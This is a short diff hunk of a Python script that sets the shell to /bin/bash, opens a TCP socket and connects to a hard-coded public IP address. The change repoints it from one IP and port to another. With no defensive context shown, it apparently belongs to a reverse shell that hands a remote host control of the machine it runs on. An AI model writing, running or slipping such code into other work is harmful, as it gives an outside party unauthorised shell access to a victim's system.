@@ -7,7 +7,7 @@ shell = "/bin/bash"
 def main():
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
-		s.connect(('106.13.173.165',9001))
+		s.connect(('139.9.4.127',9999))
 		
 	except:
 		exit(1)
